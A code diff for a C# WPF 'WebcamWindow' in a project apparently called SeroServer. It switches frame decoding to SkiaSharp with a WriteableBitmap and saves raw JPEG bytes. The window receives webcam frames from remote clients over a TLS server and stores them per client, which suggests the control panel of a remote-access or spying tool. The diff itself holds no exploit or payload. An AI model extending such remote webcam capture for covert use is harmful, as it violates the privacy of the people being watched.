@@ -4,8 +4,11 @@ using System.Text.Json;
 using System.Windows;
 using System.Windows.Controls.Primitives;
 using System.Windows.Input;
+using System.Windows.Media;
 using System.Windows.Media.Animation;
 using System.Windows.Media.Imaging;
+using SkiaSharp;
+using System.Runtime.InteropServices;
 using DevExpress.Xpf.Core;
 using SeroServer.Net;
 using SeroServer.Protocol;
@@ -32,6 +35,7 @@ public partial class WebcamWindow : ThemedWindow
     private static System.Windows.Media.SolidColorBrush MakeBrush(byte r, byte g, byte b)
     { var br = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(r, g, b)); br.Freeze(); return br; }
     private DateTime _lastAutoSave = DateTime.MinValue;
+    private WriteableBitmap? _wb;
 
     public WebcamWindow(TlsServer server, string clientId)
     {
@@ -287,20 +291,38 @@ public partial class WebcamWindow : ThemedWindow
             string j64 = jEl.GetString() ?? "";
             if (string.IsNullOrEmpty(j64)) return;
 
+            _bytesReceived += json.Length;
+            var jpegBytes = Convert.FromBase64String(j64);
             Task.Run(() =>
             {
                 try
                 {
-                    _bytesReceived += json.Length;
-                    var bytes = Convert.FromBase64String(j64);
-                    using var ms = new MemoryStream(bytes);
-                    var bi = new BitmapImage();
-                    bi.BeginInit();
-                    bi.StreamSource = ms;
-                    bi.CacheOption = BitmapCacheOption.OnLoad;
-                    bi.EndInit();
-                    bi.Freeze();
-                    if (!_closed) Dispatcher.BeginInvoke(() => ShowFrame(bi));
+                    var jpHandle = GCHandle.Alloc(jpegBytes, GCHandleType.Pinned);
+                    byte[]? pixels = null;
+                    int w = 0, h = 0, stride = 0;
+                    try
+                    {
+                        using var skData = SKData.Create(jpHandle.AddrOfPinnedObject(), jpegBytes.Length);
+                        using var codec  = SKCodec.Create(skData);
+                        if (codec != null)
+                        {
+                            w = codec.Info.Width; h = codec.Info.Height; stride = w * 4;
+                            pixels = new byte[stride * h];
+                            var pxHandle = GCHandle.Alloc(pixels, GCHandleType.Pinned);
+                            try
+                            {
+                                var info = new SKImageInfo(w, h, SKColorType.Bgra8888, SKAlphaType.Opaque);
+                                if (codec.GetPixels(info, pxHandle.AddrOfPinnedObject()) != SKCodecResult.Success)
+                                    pixels = null;
+                            }
+                            finally { pxHandle.Free(); }
+                        }
+                    }
+                    finally { jpHandle.Free(); }
+
+                    if (pixels == null || _closed) return;
+                    int cw = w, ch = h, cs = stride;
+                    Dispatcher.BeginInvoke(() => ShowFrame(pixels, cw, ch, cs, jpegBytes));
                 }
                 catch { }
             });
@@ -312,10 +334,17 @@ public partial class WebcamWindow : ThemedWindow
         _ = _server.SendToClient(_clientId,
             new Packet { Type = PacketType.WcamFrameAck, Data = "{}" });
 
-    private void ShowFrame(BitmapImage bi)
+    private void ShowFrame(byte[] pixels, int w, int h, int stride, byte[] jpegBytes)
     {
         if (_closed || !_streaming) return;
-        ImgFrame.Source = bi;
+        if (_wb == null || _wb.PixelWidth != w || _wb.PixelHeight != h)
+        {
+            _wb = new WriteableBitmap(w, h, 96, 96, PixelFormats.Bgra32, null);
+            ImgFrame.Source = _wb;
+        }
+        _wb.Lock();
+        _wb.WritePixels(new Int32Rect(0, 0, w, h), pixels, stride, 0);
+        _wb.Unlock();
         TxtPlaceholder.Visibility = Visibility.Collapsed;
         _frameCount++;
         var now = DateTime.UtcNow;
@@ -327,13 +356,13 @@ public partial class WebcamWindow : ThemedWindow
             UpdateMetrics();
         }
 
-        // Auto-save: one frame per second while checkbox is checked
+        // Auto-save: write raw JPEG bytes (no re-encode overhead)
         if (ChkAutoSave.IsChecked == true && (now - _lastAutoSave).TotalSeconds >= 1.0)
         {
             _lastAutoSave = now;
-            SaveFrame(bi);
+            SaveFrame(jpegBytes);
         }
-        
+
         if (!_closed) SendAck();
     }
     
@@ -353,7 +382,7 @@ public partial class WebcamWindow : ThemedWindow
         }
     }
 
-    private void SaveFrame(BitmapImage bi)
+    private void SaveFrame(byte[] jpegBytes)
     {
         Task.Run(() =>
         {
@@ -362,10 +391,7 @@ public partial class WebcamWindow : ThemedWindow
                 var dir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Clients", _clientId, "Webcam");
                 Directory.CreateDirectory(dir);
                 var path = Path.Combine(dir, $"{DateTime.Now:yyyyMMdd_HHmmss}.jpg");
-                using var fs = File.Create(path);
-                var enc = new System.Windows.Media.Imaging.JpegBitmapEncoder { QualityLevel = 95 };
-                enc.Frames.Add(System.Windows.Media.Imaging.BitmapFrame.Create(bi));
-                enc.Save(fs);
+                File.WriteAllBytes(path, jpegBytes);
                 Dispatcher.BeginInvoke(() => TxtStatus.Text = string.Format(Lang.Get("SAVED"), Path.GetFileName(path)));
             }
             catch { }
